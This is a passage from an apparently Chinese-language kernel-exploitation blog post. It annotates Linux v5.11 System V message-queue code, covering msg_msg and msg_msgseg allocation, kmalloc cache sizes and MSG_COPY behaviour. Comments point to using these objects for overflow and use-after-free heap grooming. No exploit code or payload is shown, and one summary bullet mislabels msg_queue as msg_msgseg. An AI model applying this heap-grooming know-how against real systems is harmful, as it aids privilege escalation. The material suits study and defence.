<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个才是实际申请的堆块内存</span></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//进行相关注册</span></span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下面一堆看不懂在干啥</span></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>创建的结构体如下所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="comment">//这些为一些相关信息</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//存放msg_msg相关指针next、prev,比较重要,通常拿来溢出制造UAF</span></span><br><span class="line">    <span class="comment">//和该消息队列里的所有消息组成双向循环链表</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>接着当使用<code>msgsnd</code>函数传递消息时，会创建新的<code>msg_msg</code>结构体，消息过长的话就会创建更多的<code>msg_msgseg</code>来存储更多的消息。相关的函数调用链如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)-&gt;do_msgsnd()-&gt;load_msg()-&gt;alloc_msg()</span><br></pre></td></tr></table></div></figure>

<p>主要还是关注在<code>alloc_msg()</code>函数</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//最大发送DATALEN_MSG长度的消息</span></span><br><span class="line">    <span class="comment">//#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line">    <span class="comment">//这里的PAGE_SIZE为0x400,即最多kmalloc-</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">    <span class="comment">//使用正常</span></span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果传入消息长度超过0x400-0x30,就再进行申请msg_msgseg。</span></span><br><span class="line">    <span class="comment">//使用kmalloc申请,标志为GFP_KERNEL_ACCOUNT。</span></span><br><span class="line">    <span class="comment">//最大也为0x400,也属于kmalloc-1024</span></span><br><span class="line">    <span class="comment">//还有再长的消息,就再申请msg_msgseg</span></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">		<span class="comment">//不知道干啥的</span></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">        <span class="comment">//申请完之后,将msg_msgseg放到msg-&gt;next这个单向链表上</span></span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>msg_msg</code>结构体如下，头部大小<code>0x30</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//与msg_queue或者其他的msg_msg组成双向循环链表</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//单向链表，指向该条信息后面的msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png" alt="image-20220511220130886" style="zoom:80%;" /></li>
<li><p><code>msg_msgseq</code>结构如下，只是一个<code>struct msg_msgseg*</code>指针</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png" alt="image-20220511220627775" style="zoom:80%;" /></li>
</ul>
</li>
</ul>

        <h6 id="相关内存结构："   >
          <a href="#相关内存结构：" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关内存结构：" class="headerlink" title="相关内存结构："></a>相关内存结构：</h6>
      <p>在一个<code>msg_queue</code>队列下，消息长度为<code>0x1000-0x30-0x8-0x8-0x8</code></p>
<ul>
<li><p>一条消息：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png" alt="image-20220511231539231"></p>
</li>
<li><p>两条消息：</p>
<p>以<code>msg_queue</code>的<code>struct list_head q_messages;</code>域为链表头，和<code>msg_msg</code>结构的<code>struct list_head m_list</code>域串联所有的<code>msg_msg</code>形成双向循环链表</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件"></p>
</li>
</ul>
<p>同理，同一个<code>msg_queue</code>消息队列下的多条消息也是类似的</p>

        <h6 id="内存申请总结："   >
          <a href="#内存申请总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存申请总结：" class="headerlink" title="内存申请总结："></a>内存申请总结：</h6>
      <ul>
<li>使用<code>msgget()</code>函数创建内核空间的消息队列结构<code>msg_msgseg</code>，返回值为消息队列的<code>id</code>标志<code>queue_id</code><ul>
<li><code>msg_msgseg</code>管理整个消息队列，大小为0x100，<code>kmalloc-256</code>。</li>
<li>其<code>struct list_head q_messages;</code>域为链表头，和<code>msg_msg</code>结构的<code>struct list_head m_list</code>域串联所有的<code>msg_msg</code>形成双向循环链表</li>
</ul>
</li>
<li>每次在该消息队列<code>queue_id</code>下调用<code>msgsnd()</code>函数都会申请内核空间的<code>msg_msg</code>结构，消息长度大于<code>0x400-0x30</code>就会申请内核空间的<code>msg_msgseg</code>结构<ul>
<li><code>msg_msg</code>为每条消息存放消息数据的结构，与<code>msg_queue</code>形成双向循环链表，与<code>msg_msgseg</code>形成单向链表大小最大为0x400，属于<code>kmalloc-64</code>至<code>kmalloc-1024</code></li>
<li><code>msg_msgseg</code>也为每条消息存放消息数据的结构，挂在<code>msg_msg</code>单向链表中，大小最大为<code>0x400</code>，属于<code>kmalloc-16</code>至<code>kmalloc-1024</code>，当消息长度很长时就会申请很多的内核空间的<code>msg_msgseg</code>结构。</li>
</ul>
</li>
</ul>

        <h5 id="B-数据复制"   >
          <a href="#B-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-数据复制" class="headerlink" title="B.数据复制"></a>B.数据复制</h5>
      <p>调用完<code>alloc_msg()</code>函数后，回到<code>load_msg()</code>函数接着进行数据复制，函数还是挺简单的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//先复制进msg_msg中存放消息的部分</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历msg_msg下的msg_msgseg,逐个存放数据进去</span></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放"   >
          <a href="#②释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放" class="headerlink" title="②释放"></a>②释放</h4>
      <p>相关的函数调用链</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)-&gt;SYS_msgrcv()-&gt;ksys_msgrcv()-&gt;do_msgrcv()-&gt;do_msg_fill()-&gt;store_msg()</span><br></pre></td></tr></table></div></figure>

<p>首先关注一下<code>do_msgrcv()</code>函数，里面很多东西都比较重要</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    DEFINE_WAKE_Q(wake_q);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">//设置了MSG_COPY标志位就会准备一个msg_msg的副本copy,通常用来防止unlink</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">        <span class="comment">//从这里可以看出,同样也需要设置IPC_NOWAIT标志位才不会出错</span></span><br><span class="line">        <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="comment">//这个prepare_copy()函数内部调用了load_msg()函数来创建一个新的msg_msg/msg_msgseg</span></span><br><span class="line">        <span class="comment">//传入的size参数为bufsz,就用户空间实际需要消息的长度,那么申请的堆块长度就可变了</span></span><br><span class="line">        <span class="comment">//不一定是这条消息的长度,而是由我们直接控制,虽然最后也会释放掉</span></span><br><span class="line">        copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            struct msg_msg *copy;</span></span><br><span class="line"><span class="comment">            </span></span><br><span class="line"><span class="comment">            copy = load_msg(buf, bufsz);</span></span><br><span class="line"><span class="comment">            if (!IS_ERR(copy))</span></span><br><span class="line"><span class="comment">                copy-&gt;m_ts = bufsz;</span></span><br><span class="line"><span class="comment">            return copy;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">            <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这样就不会将msg_msg从msg_queue消息队列中进行Unlink摘除</span></span><br><span class="line">    <span class="comment">//只是释放堆块,在后续的代码中有显示</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//开始从msg_queue中寻找合适的msg_msg</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">        msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">        <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//最好设置MSG_NOERROR标志位,这样请求获取消息长度小于m_ts程序也不会退出了</span></span><br><span class="line">            <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">                msg = ERR_PTR(-E2BIG);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//设置了MSG_COPY标志位就会将msg数据复制给copy,然后将copy赋给msg</span></span><br><span class="line">            <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">                <span class="comment">//这个copy_msg()函数就是之前提到的在汇编层面就很奇怪</span></span><br><span class="line">                msg = copy_msg(msg, copy);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//下面是将msg_msg从和msg_queue组成的双向循环链表中unlink出来的部分</span></span><br><span class="line">            list_del(&amp;msg-&gt;m_list);</span><br><span class="line">            msq-&gt;q_qnum--;</span><br><span class="line">            msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">            ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">            msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">            atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">            atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">            ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">    ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">    wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="comment">//如果存在copy副本,那么就free掉copy副本,然后返回,而不会free掉原本的msg堆块</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">        free_copy(copy);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这个msg_handler函数指针即为传入的do_msg_fill()函数,从里面进行相关的数据复制</span></span><br><span class="line">    bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">    <span class="comment">//最后在这里进行相关堆块的释放</span></span><br><span class="line">    free_msg(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h5 id="A-非堆块释放的数据读取"   >
          <a href="#A-非堆块释放的数据读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-非堆块释放的数据读取" class="headerlink" title="A.非堆块释放的数据读取"></a>A.非堆块释放的数据读取</h5>
